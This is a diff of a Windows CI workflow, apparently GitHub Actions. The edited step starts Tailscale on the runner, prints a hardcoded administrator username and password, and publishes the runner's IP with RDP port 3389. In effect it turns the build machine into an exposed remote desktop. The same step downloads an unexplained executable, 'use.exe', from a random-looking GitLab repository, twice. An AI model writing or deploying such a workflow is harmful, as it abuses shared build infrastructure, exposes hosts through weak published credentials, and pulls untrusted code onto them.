@@ -20,11 +20,11 @@ jobs:
 
       - name: Start 
         run: |
-           dir "C:\Program Files\Tailscale\"
+           cmd /c '"C:\Program Files\Tailscale\tailscale.exe" up'
            Write-Host "Username: Admin"
            Write-Host "Password: P@ss0wrd!"
-           $TAIL_IP = & tailscale ip -4
-           Write-Host "Access from here: $TAIL_IP"
+           $TAIL_IP = cmd /c '"C:\Program Files\Tailscale\tailscale.exe" ip -4'
+           Write-Host "Access from here: $TAIL_IP (port 3389)"
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            cmd /c sleep 240
            cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
